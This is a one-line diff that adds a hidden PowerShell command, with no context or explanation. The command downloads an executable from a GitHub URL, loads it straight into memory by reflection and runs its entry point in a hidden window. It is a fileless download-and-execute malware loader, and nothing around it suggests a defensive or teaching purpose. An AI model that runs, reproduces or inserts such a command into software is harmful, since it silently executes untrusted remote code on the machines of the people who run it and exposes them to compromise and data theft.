@@ -1,0 +1,1 @@
+powershell -NoProfile -WindowStyle Hidden -Command "$link='https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe';$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData($link));$e=$a.EntryPoint;if($e.GetParameters().Count){$e.Invoke($null,@([string[]]@()))}else{$e.Invoke($null,$null)}"
